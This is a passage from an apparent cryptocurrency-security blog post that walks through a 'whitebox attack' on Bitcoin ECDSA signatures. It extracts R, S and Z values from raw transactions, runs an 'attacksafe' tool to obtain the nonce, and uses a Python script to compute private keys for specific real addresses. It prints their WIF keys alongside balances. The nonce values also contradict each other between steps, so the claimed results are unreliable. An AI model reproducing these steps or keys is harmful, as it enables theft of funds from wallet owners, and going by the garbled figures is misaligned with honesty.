Z = 0xa402dc224f712e09602b06c595f272f3e09408f052d8fba3d88609bbbb150139</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>To get the secret key from a vulnerable ECDSA signing transaction, let’s add the data&nbsp;<code>RawTX</code>to a text document and save it as a file<code>RawTX.txt</code></p>



<pre class="wp-block-code"><code>0100000001794e79fc042a7644cc4deb6e7858416dd8b898fe418b2894f8d3772ce8d132a0180000006a473044022048771a103dbc561b895d573a9b706b98f643701466de15980fa712b544554ba502202756e42292c841ccfef832138c52f66f7e03b7f2f86cf3fb4d7fd43d6a526be701210262c3a8791c0e44cd389ebe51c156b5aac490cddef3536638abf8863d55190adbffffffff010c03000000000000232103d68f90ba81455256cb7a0df14fb3930d6df61393207f2f3e71659414d296e0f0ac00000000</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Launch&nbsp;<code>-tool whitebox_attack</code>using software<code>“ATTACKSAFE SOFTWARE”</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>./attacksafe -tool whitebox_attack -open RawTX.txt -save SecretKey.txt</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-47-1024x262.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1649"></figure>



<p>We launched this attack from&nbsp;<code>-tool whitebox_attack</code>and the result was saved to a file<code>SecretKey.txt</code></p>



<p>Now to see the successful result, open the file<code>SecretKey.txt</code></p>



<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-46-1024x374.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1647"></figure>



<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0xa402dc224f712e09602b06c595f272f3028a6a6f6ef174708aac8121c40e8545

RawTX = 0100000001794e79fc042a7644cc4deb6e7858416dd8b898fe418b2894f8d3772ce8d132a0180000006a473044022048771a103dbc561b895d573a9b706b98f643701466de15980fa712b544554ba502202756e42292c841ccfef832138c52f66f7e03b7f2f86cf3fb4d7fd43d6a526be701210262c3a8791c0e44cd389ebe51c156b5aac490cddef3536638abf8863d55190adbffffffff010c03000000000000232103d68f90ba81455256cb7a0df14fb3930d6df61393207f2f3e71659414d296e0f0ac00000000</code></pre>



<p>We see an inscription&nbsp;<code>"Deployments ECDSA"</code>that means a critical vulnerability in the Bitcoin blockchain transaction.</p>



<p><code>SecretKey value in HEX format, this is our secret key "K" (NONCE):</code></p>



<p><code>K = 0x39ec5220d3937da589231cbaa5b04002ce3b5689173680ee110ef81287f7867e</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s check with a&nbsp;<em>Python</em>&nbsp;script<code>point2gen.py</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>Let’s use the ECPy</strong></a>&nbsp;elliptic curve library&nbsp;:</p>



<p>Now let’s run the script by specifying&nbsp;<code>Secret Key "K" (NONCE)</code>:</p>



<pre class="wp-block-code"><code>python3 point2gen.py 0xa402dc224f712e09602b06c595f272f3028a6a6f6ef174708aac8121c40e8545</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-48-1024x86.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1651"></figure>



<p><code>(0x48771a103dbc561b895d573a9b706b98f643701466de15980fa712b544554ba5 , 0x2c4374cfc4d21df60a3e7592c8ec0ca98640af2adc89276f75d80e65381a36ec)</code></p>



<p>Checking the coordinates of a point&nbsp;<code>EC (secp256k1)&nbsp;</code>with a signature value<code>R</code></p>



<pre class="wp-block-code"><code>R = 0x48771a103dbc561b895d573a9b706b98f643701466de15980fa712b544554ba5
S = 0x2756e42292c841ccfef832138c52f66f7e03b7f2f86cf3fb4d7fd43d6a526be7
Z = 0xa402dc224f712e09602b06c595f272f3e09408f052d8fba3d88609bbbb150139</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>R          =    0x48771a103dbc561b895d573a9b706b98f643701466de15980fa712b544554ba5
point2gen  =   (0x48771a103dbc561b895d573a9b706b98f643701466de15980fa712b544554ba5 , 0x2c4374cfc4d21df60a3e7592c8ec0ca98640af2adc89276f75d80e65381a36ec)
</code></pre>



<p><code>ALL CORRECT!</code></p>



<p><code>K = 0xa402dc224f712e09602b06c595f272f3028a6a6f6ef174708aac8121c40e8545</code></p>



<p>Now knowing the secret key, we can get the private key to the Bitcoin Wallet:<code>12bXHGbbWeqyixHpNjeSmq271ennbLRXh9</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s use&nbsp; the&nbsp;<em>Python</em>&nbsp;script:&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; Get the Private Key</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s open the code and add all the value of the signatures<code><strong>K, R, S, Z</strong></code></p>



<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0xa402dc224f712e09602b06c595f272f3028a6a6f6ef174708aac8121c40e8545
R = 0x48771a103dbc561b895d573a9b706b98f643701466de15980fa712b544554ba5
S = 0x2756e42292c841ccfef832138c52f66f7e03b7f2f86cf3fb4d7fd43d6a526be7
Z = 0xa402dc224f712e09602b06c595f272f3e09408f052d8fba3d88609bbbb150139


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>



<h2>The script will calculate the private key using the formula:</h2>



<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>



<p>Let’s run the script:</p>



<pre class="wp-block-code"><code>python3 calculate.py</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-49.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1653"></figure>



<p><code>PrivKey = 028a6a6f6ef174708aac8121c40e8545def4e73d5dd98f8a343f083a49fca03d</code></p>



<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">Let’s open bitaddress</a></strong>&nbsp;and&nbsp;check:</p>



<pre class="wp-block-code"><code>ADDR: 12bXHGbbWeqyixHpNjeSmq271ennbLRXh9
WIF:  KwJedezSt21uB3ZoHvzkWbcad4VLaJXu8467Jw58j47s4cseQJrk
HEX:  028a6a6f6ef174708aac8121c40e8545def4e73d5dd98f8a343f083a49fca03d</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/002-2.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1691"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://www.blockchain.com/btc/address/12bXHGbbWeqyixHpNjeSmq271ennbLRXh9">https://www.blockchain.com/btc/address/12bXHGbbWeqyixHpNjeSmq271ennbLRXh9</a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><code>Private Key Found!</code></p>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/002-addr.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1655"><figcaption class="wp-element-caption"><strong><a href="https://www.blockchain.com/btc/address/12bXHGbbWeqyixHpNjeSmq271ennbLRXh9" target="_blank" rel="noreferrer noopener"><code>www.blockchain.com/btc/address/12bXHGbbWeqyixHpNjeSmq271ennbLRXh9</code></a></strong></figcaption></figure>



<p><code>BALANCE: $ 635.44</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong><code>№3</code></strong></p>



<p>With detailed cryptanalysis, we also found a critical vulnerability in Bitcoin Address:</p>



<blockquote class="wp-block-quote">
<p><strong><a href="https://btc1.trezor.io/address/15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz" target="_blank" rel="noreferrer noopener">15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz</a></strong></p>



<p><a href="https://btc1.trezor.io/tx/c8bbc3b05bc3a560ed5f4655c73cccf5cf6ff09b62279691df06ad8a121c9859">https://btc1.trezor.io/tx/c8bbc3b05bc3a560ed5f4655c73cccf5cf6ff09b62279691df06ad8a121c9859</a></p>



<p><a href="https://btc1.trezor.io/tx/1bd43bdeb2d76f0c24eef5abddfdc439f02406375ccc02d44299715b057bdf7e">https://btc1.trezor.io/tx/1bd43bdeb2d76f0c24eef5abddfdc439f02406375ccc02d44299715b057bdf7e</a></p>
</blockquote>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-4-1024x201.png" alt="WhiteBox Attack" class="wp-image-1531"></figure></div>

<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-5-1024x200.png" alt="WhiteBox Attack" class="wp-image-1533"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Prepare RawTX for the attack</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote">
<p><strong><a href="https://btc1.trezor.io/address/15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz" target="_blank" rel="noreferrer noopener">15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz</a></strong></p>



<p><a href="https://btc1.trezor.io/tx/c8bbc3b05bc3a560ed5f4655c73cccf5cf6ff09b62279691df06ad8a121c9859">https://btc1.trezor.io/tx/c8bbc3b05bc3a560ed5f4655c73cccf5cf6ff09b62279691df06ad8a121c9859</a></p>
</blockquote>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-50-1024x142.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1656"></figure>



<pre class="wp-block-code"><code>RawTX = 01000000015c55f614688adf76c9186a89af07d4aca2aba8d612d6b445e8bd500bef21dac62b0000006a47304402207f252f8be450d3a7573c9a69ae96392e23dd58d7dc0ca3b835b9760f4056772d0220712f483ef5f8b98166fa673c6a8eb8379249cb1a3a7842d1d877096fca773677012102506c7593c4e301c2729dbfc46b2959c7a92f6f20c672b6d0feff9c5b6a567cf9ffffffff01c6020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000
</code></pre>



<h2>Now we need to get all R, S, Z values ​​from all vulnerable transactions</h2>



<p>Let’s use the breakECDSA.py script</p>



<pre class="wp-block-code"><code>python2 breakECDSA.py 01000000015c55f614688adf76c9186a89af07d4aca2aba8d612d6b445e8bd500bef21dac62b0000006a47304402207f252f8be450d3a7573c9a69ae96392e23dd58d7dc0ca3b835b9760f4056772d0220712f483ef5f8b98166fa673c6a8eb8379249cb1a3a7842d1d877096fca773677012102506c7593c4e301c2729dbfc46b2959c7a92f6f20c672b6d0feff9c5b6a567cf9ffffffff01c6020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000
</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-51-1024x213.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1658"></figure>



<pre class="wp-block-code"><code>R = 0x7f252f8be450d3a7573c9a69ae96392e23dd58d7dc0ca3b835b9760f4056772d
S = 0x712f483ef5f8b98166fa673c6a8eb8379249cb1a3a7842d1d877096fca773677
Z = 0x2a3395f1143929b17c0dd24f89fc6eceee3d099c2286b7d1f147886ca30e5a7d</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>To get the secret key from a vulnerable ECDSA signing transaction, let’s add the data&nbsp;<code>RawTX</code>to a text document and save it as a file<code>RawTX.txt</code></p>



<pre class="wp-block-code"><code>01000000015c55f614688adf76c9186a89af07d4aca2aba8d612d6b445e8bd500bef21dac62b0000006a47304402207f252f8be450d3a7573c9a69ae96392e23dd58d7dc0ca3b835b9760f4056772d0220712f483ef5f8b98166fa673c6a8eb8379249cb1a3a7842d1d877096fca773677012102506c7593c4e301c2729dbfc46b2959c7a92f6f20c672b6d0feff9c5b6a567cf9ffffffff01c6020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Launch&nbsp;<code>-tool whitebox_attack</code>using software<code>“ATTACKSAFE SOFTWARE”</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>./attacksafe -tool whitebox_attack -open RawTX.txt -save SecretKey.txt</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-52-1024x268.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1660"></figure>



<p>We launched this attack from&nbsp;<code>-tool whitebox_attack</code>and the result was saved to a file<code>SecretKey.txt</code></p>



<p>Now to see the successful result, open the file<code>SecretKey.txt</code></p>



<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-53-1024x376.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1662"></figure>



<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0xdd3fee317f873f30a38a54c2566a07cb7682612e3564996017b993b5416fcddc

RawTX = 01000000015c55f614688adf76c9186a89af07d4aca2aba8d612d6b445e8bd500bef21dac62b0000006a47304402207f252f8be450d3a7573c9a69ae96392e23dd58d7dc0ca3b835b9760f4056772d0220712f483ef5f8b98166fa673c6a8eb8379249cb1a3a7842d1d877096fca773677012102506c7593c4e301c2729dbfc46b2959c7a92f6f20c672b6d0feff9c5b6a567cf9ffffffff01c6020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>



<p>We see an inscription&nbsp;<code>"Deployments ECDSA"</code>that means a critical vulnerability in the Bitcoin blockchain transaction.</p>



<p><code>SecretKey value in HEX format, this is our secret key "K" (NONCE):</code></p>



<p><code>K = 0xdd3fee317f873f30a38a54c2566a07cb7682612e3564996017b993b5416fcddc</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s check with a&nbsp;<em>Python</em>&nbsp;script<code>point2gen.py</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>Let’s use the ECPy</strong></a>&nbsp;elliptic curve library&nbsp;:</p>



<p>Now let’s run the script by specifying&nbsp;<code>Secret Key "K" (NONCE)</code>:</p>



<pre class="wp-block-code"><code>python3 point2gen.py 0xdd3fee317f873f30a38a54c2566a07cb7682612e3564996017b993b5416fcddc</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-54-1024x87.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1663"></figure>



<p><code>(0x7f252f8be450d3a7573c9a69ae96392e23dd58d7dc0ca3b835b9760f4056772d , 0xe4eedac586ca23bf57a44e5de537e097ea28205a4eeef93c51fe2ee2b783280e)</code></p>



<p>Checking the coordinates of a point&nbsp;<code>EC (secp256k1)&nbsp;</code>with a signature value<code>R</code></p>



<pre class="wp-block-code"><code>R = 0x7f252f8be450d3a7573c9a69ae96392e23dd58d7dc0ca3b835b9760f4056772d
S = 0x712f483ef5f8b98166fa673c6a8eb8379249cb1a3a7842d1d877096fca773677
Z = 0x2a3395f1143929b17c0dd24f89fc6eceee3d099c2286b7d1f147886ca30e5a7d</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>R          =    0x7f252f8be450d3a7573c9a69ae96392e23dd58d7dc0ca3b835b9760f4056772d
point2gen  =   (0x7f252f8be450d3a7573c9a69ae96392e23dd58d7dc0ca3b835b9760f4056772d , 0xe4eedac586ca23bf57a44e5de537e097ea28205a4eeef93c51fe2ee2b783280e)
</code></pre>



<p><code>ALL CORRECT!</code></p>



<p><code>K = 0xdd3fee317f873f30a38a54c2566a07cb7682612e3564996017b993b5416fcddc</code></p>



<p>Now knowing the secret key, we can get the private key to the Bitcoin Wallet:<code>15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s use&nbsp; the&nbsp;<em>Python</em>&nbsp;script:&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; Get the Private Key</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s open the code and add all the value of the signatures<code><strong>K, R, S, Z</strong></code></p>



<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0xdd3fee317f873f30a38a54c2566a07cb7682612e3564996017b993b5416fcddc
R = 0x7f252f8be450d3a7573c9a69ae96392e23dd58d7dc0ca3b835b9760f4056772d
S = 0x712f483ef5f8b98166fa673c6a8eb8379249cb1a3a7842d1d877096fca773677
Z = 0x2a3395f1143929b17c0dd24f89fc6eceee3d099c2286b7d1f147886ca30e5a7d


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>



<h2>The script will calculate the private key using the formula:</h2>



<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>



<p>Let’s run the script:</p>



<pre class="wp-block-code"><code>python3 calculate.py</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-55.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1664"></figure>



<p><code>PrivKey = 16f2eaf0c267f036f926d0b1332c05f244427c65ce70a11b96842bf1a8221301</code></p>



<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">Let’s open bitaddress</a></strong>&nbsp;and&nbsp;check:</p>



<pre class="wp-block-code"><code>ADDR: 15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz
WIF:  KwzKYYfPTrdAZA5m1kxs4WAjSWTuJRnD2ANKHGUugibgFBP4oDSG
HEX:  16f2eaf0c267f036f926d0b1332c05f244427c65ce70a11b96842bf1a8221301</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/003-1.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1693"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://www.blockchain.com/btc/address/15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz">https://www.blockchain.com/btc/address/15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz</a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><code>Private Key Found!</code></p>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-57-1024x476.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1667"><figcaption class="wp-element-caption"><strong><a href="https://www.blockchain.com/btc/address/15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz" target="_blank" rel="noreferrer noopener"><code>www.blockchain.com/btc/address/15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz</code></a></strong></figcaption></figure>



<p><code>BALANCE: $ 657.68</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote">
<p><em>The potential threat of losing BTC coins lies in the critical vulnerability of the Bitcoin blockchain transaction, so we strongly recommend that everyone always update the software and use only verified devices.</em></p>
</blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>With detailed cryptanalysis, we also found a critical vulnerability in&nbsp;<strong><a href="https://btc1.trezor.io/tx/1bd43bdeb2d76f0c24eef5abddfdc439f02406375ccc02d44299715b057bdf7e" target="_blank" rel="noreferrer noopener">1bd43bdeb2d76f0c24eef5abddfdc439f02406375ccc02d44299715b057bdf7e</a></strong>&nbsp;for the same Bitcoin Address<strong><code>&nbsp;TXID:</code></strong><strong><a href="https://btc1.trezor.io/tx/1bd43bdeb2d76f0c24eef5abddfdc439f02406375ccc02d44299715b057bdf7e" target="_blank" rel="noreferrer noopener"></a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Prepare RawTX for the attack</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote">
<p><strong><a href="https://btc1.trezor.io/address/15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz" target="_blank" rel="noreferrer noopener">15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz</a></strong></p>



<p><a href="https://btc1.trezor.io/tx/1bd43bdeb2d76f0c24eef5abddfdc439f02406375ccc02d44299715b057bdf7e">https://btc1.trezor.io/tx/1bd43bdeb2d76f0c24eef5abddfdc439f02406375ccc02d44299715b057bdf7e</a></p>
</blockquote>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-58-1024x138.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1670"></figure>



<pre class="wp-block-code"><code>RawTX = 0100000001090090e02de381ea337027a92b40cf9ea64c49f3ff4a5dc6e86514cbb3e6fbba210000006b483045022100abfd0edfab28bfdaffd134487cbba8baba8796ae5da45cf5bdd8b73f221edfc902201b52781a8e038c877146d0671638be48da3a0e946589ebdc3bb876d351292ddc012102506c7593c4e301c2729dbfc46b2959c7a92f6f20c672b6d0feff9c5b6a567cf9ffffffff0180020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000
</code></pre>



<h2>Now we need to get all R, S, Z values ​​from all vulnerable transactions</h2>



<p>Let’s use the breakECDSA.py script</p>



<pre class="wp-block-code"><code>python2 breakECDSA.py 0100000001090090e02de381ea337027a92b40cf9ea64c49f3ff4a5dc6e86514cbb3e6fbba210000006b483045022100abfd0edfab28bfdaffd134487cbba8baba8796ae5da45cf5bdd8b73f221edfc902201b52781a8e038c877146d0671638be48da3a0e946589ebdc3bb876d351292ddc012102506c7593c4e301c2729dbfc46b2959c7a92f6f20c672b6d0feff9c5b6a567cf9ffffffff0180020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000
</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-59-1024x213.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1671"></figure>



<pre class="wp-block-code"><code>R = 0xabfd0edfab28bfdaffd134487cbba8baba8796ae5da45cf5bdd8b73f221edfc9
S = 0x1b52781a8e038c877146d0671638be48da3a0e946589ebdc3bb876d351292ddc
Z = 0x4ff2faf760c97ea590a3c7deec2698695e9559d629d1e73271623fd07cfbeffa</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>To get the secret key from a vulnerable ECDSA signing transaction, let’s add the data&nbsp;<code>RawTX</code>to a text document and save it as a file<code>RawTX.txt</code></p>



<pre class="wp-block-code"><code>0100000001090090e02de381ea337027a92b40cf9ea64c49f3ff4a5dc6e86514cbb3e6fbba210000006b483045022100abfd0edfab28bfdaffd134487cbba8baba8796ae5da45cf5bdd8b73f221edfc902201b52781a8e038c877146d0671638be48da3a0e946589ebdc3bb876d351292ddc012102506c7593c4e301c2729dbfc46b2959c7a92f6f20c672b6d0feff9c5b6a567cf9ffffffff0180020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Launch&nbsp;<code>-tool whitebox_attack</code>using software<code>“ATTACKSAFE SOFTWARE”</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>./attacksafe -tool whitebox_attack -open RawTX.txt -save SecretKey.txt</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-60-1024x258.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1673"></figure>



<p>We launched this attack from&nbsp;<code>-tool whitebox_attack</code>and the result was saved to a file<code>SecretKey.txt</code></p>



<p>Now to see the successful result, open the file<code>SecretKey.txt</code></p>



<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-61-1024x376.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1674"></figure>



<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0xe7d9497ff0bab6f5dbbed781bc75be51ad98bbd70304e4def52c64e90b9822c2

RawTX = 0100000001090090e02de381ea337027a92b40cf9ea64c49f3ff4a5dc6e86514cbb3e6fbba210000006b483045022100abfd0edfab28bfdaffd134487cbba8baba8796ae5da45cf5bdd8b73f221edfc902201b52781a8e038c877146d0671638be48da3a0e946589ebdc3bb876d351292ddc012102506c7593c4e301c2729dbfc46b2959c7a92f6f20c672b6d0feff9c5b6a567cf9ffffffff0180020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>



<p>We see an inscription&nbsp;<code>"Deployments ECDSA"</code>that means a critical vulnerability in the Bitcoin blockchain transaction.</p>



<p><code>SecretKey value in HEX format, this is our secret key "K" (NONCE):</code></p>



<p><code>K = 0xdd3fee317f873f30a38a54c2566a07cb7682612e3564996017b993b5416fcddc</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s check with a&nbsp;<em>Python</em>&nbsp;script<code>point2gen.py</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



